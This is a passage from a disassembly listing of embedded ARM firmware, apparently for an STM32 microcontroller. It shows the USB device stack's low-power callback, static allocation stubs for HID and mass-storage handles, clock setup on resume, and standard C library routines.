 800d0fe:	f023 0306 	bic.w	r3, r3, #6
 800d102:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800d104:	687b      	ldr	r3, [r7, #4]
 800d106:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d10a:	4618      	mov	r0, r3
 800d10c:	f7fe fa66 	bl	800b5dc <USBD_LL_Resume>
    break;
 800d110:	e010      	b.n	800d134 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800d112:	687b      	ldr	r3, [r7, #4]
 800d114:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d118:	4618      	mov	r0, r3
 800d11a:	f7fe fa43 	bl	800b5a4 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800d11e:	687b      	ldr	r3, [r7, #4]
 800d120:	699b      	ldr	r3, [r3, #24]
 800d122:	2b00      	cmp	r3, #0
 800d124:	d005      	beq.n	800d132 <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d126:	4b05      	ldr	r3, [pc, #20]	; (800d13c <HAL_PCDEx_LPM_Callback+0x68>)
 800d128:	691b      	ldr	r3, [r3, #16]
 800d12a:	4a04      	ldr	r2, [pc, #16]	; (800d13c <HAL_PCDEx_LPM_Callback+0x68>)
 800d12c:	f043 0306 	orr.w	r3, r3, #6
 800d130:	6113      	str	r3, [r2, #16]
    break;
 800d132:	bf00      	nop
}
 800d134:	bf00      	nop
 800d136:	3708      	adds	r7, #8
 800d138:	46bd      	mov	sp, r7
 800d13a:	bd80      	pop	{r7, pc}
 800d13c:	e000ed00 	.word	0xe000ed00

0800d140 <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800d140:	b480      	push	{r7}
 800d142:	b083      	sub	sp, #12
 800d144:	af00      	add	r7, sp, #0
 800d146:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d148:	4b03      	ldr	r3, [pc, #12]	; (800d158 <USBD_static_malloc+0x18>)
}
 800d14a:	4618      	mov	r0, r3
 800d14c:	370c      	adds	r7, #12
 800d14e:	46bd      	mov	sp, r7
 800d150:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d154:	4770      	bx	lr
 800d156:	bf00      	nop
 800d158:	20000e74 	.word	0x20000e74

0800d15c <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800d15c:	b480      	push	{r7}
 800d15e:	b083      	sub	sp, #12
 800d160:	af00      	add	r7, sp, #0
 800d162:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d164:	4b03      	ldr	r3, [pc, #12]	; (800d174 <USBD_static_malloc_MSC+0x18>)
}
 800d166:	4618      	mov	r0, r3
 800d168:	370c      	adds	r7, #12
 800d16a:	46bd      	mov	sp, r7
 800d16c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d170:	4770      	bx	lr
 800d172:	bf00      	nop
 800d174:	20000e9c 	.word	0x20000e9c

0800d178 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800d178:	b480      	push	{r7}
 800d17a:	b083      	sub	sp, #12
 800d17c:	af00      	add	r7, sp, #0
 800d17e:	6078      	str	r0, [r7, #4]

}
 800d180:	bf00      	nop
 800d182:	370c      	adds	r7, #12
 800d184:	46bd      	mov	sp, r7
 800d186:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d18a:	4770      	bx	lr

0800d18c <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800d18c:	b580      	push	{r7, lr}
 800d18e:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800d190:	f7f3 fa60 	bl	8000654 <SystemClock_Config>
}
 800d194:	bf00      	nop
 800d196:	bd80      	pop	{r7, pc}

0800d198 <memset>:
 800d198:	4402      	add	r2, r0
 800d19a:	4603      	mov	r3, r0
 800d19c:	4293      	cmp	r3, r2
 800d19e:	d100      	bne.n	800d1a2 <memset+0xa>
 800d1a0:	4770      	bx	lr
 800d1a2:	f803 1b01 	strb.w	r1, [r3], #1
 800d1a6:	e7f9      	b.n	800d19c <memset+0x4>

0800d1a8 <__libc_init_array>:
 800d1a8:	b570      	push	{r4, r5, r6, lr}
 800d1aa:	4d0d      	ldr	r5, [pc, #52]	; (800d1e0 <__libc_init_array+0x38>)
 800d1ac:	4c0d      	ldr	r4, [pc, #52]	; (800d1e4 <__libc_init_array+0x3c>)
 800d1ae:	1b64      	subs	r4, r4, r5
 800d1b0:	10a4      	asrs	r4, r4, #2
 800d1b2:	2600      	movs	r6, #0
 800d1b4:	42a6      	cmp	r6, r4
 800d1b6:	d109      	bne.n	800d1cc <__libc_init_array+0x24>
 800d1b8:	4d0b      	ldr	r5, [pc, #44]	; (800d1e8 <__libc_init_array+0x40>)
 800d1ba:	4c0c      	ldr	r4, [pc, #48]	; (800d1ec <__libc_init_array+0x44>)
 800d1bc:	f000 f826 	bl	800d20c <_init>
 800d1c0:	1b64      	subs	r4, r4, r5
 800d1c2:	10a4      	asrs	r4, r4, #2
 800d1c4:	2600      	movs	r6, #0
 800d1c6:	42a6      	cmp	r6, r4
 800d1c8:	d105      	bne.n	800d1d6 <__libc_init_array+0x2e>
 800d1ca:	bd70      	pop	{r4, r5, r6, pc}
 800d1cc:	f855 3b04 	ldr.w	r3, [r5], #4
 800d1d0:	4798      	blx	r3
 800d1d2:	3601      	adds	r6, #1
 800d1d4:	e7ee      	b.n	800d1b4 <__libc_init_array+0xc>
 800d1d6:	f855 3b04 	ldr.w	r3, [r5], #4
 800d1da:	4798      	blx	r3
 800d1dc:	3601      	adds	r6, #1
 800d1de:	e7f2      	b.n	800d1c6 <__libc_init_array+0x1e>
 800d1e0:	0800d460 	.word	0x0800d460
 800d1e4:	0800d460 	.word	0x0800d460
 800d1e8:	0800d460 	.word	0x0800d460
 800d1ec:	0800d464 	.word	0x0800d464

0800d1f0 <memcpy>:
 800d1f0:	440a      	add	r2, r1
 800d1f2:	4291      	cmp	r1, r2
 800d1f4:	f100 33ff 	add.w	r3, r0, #4294967295
 800d1f8:	d100      	bne.n	800d1fc <memcpy+0xc>
 800d1fa:	4770      	bx	lr
 800d1fc:	b510      	push	{r4, lr}
 800d1fe:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d202:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d206:	4291      	cmp	r1, r2
 800d208:	d1f9      	bne.n	800d1fe <memcpy+0xe>
 800d20a:	bd10      	pop	{r4, pc}

0800d20c <_init>:
 800d20c:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d20e:	bf00      	nop
 800d210:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d212:	bc08      	pop	{r3}
 800d214:	469e      	mov	lr, r3
 800d216:	4770      	bx	lr

0800d218 <_fini>:
 800d218:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d21a:	bf00      	nop
 800d21c:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d21e:	bc08      	pop	{r3}
 800d220:	469e      	mov	lr, r3
 800d222:	4770      	bx	lr
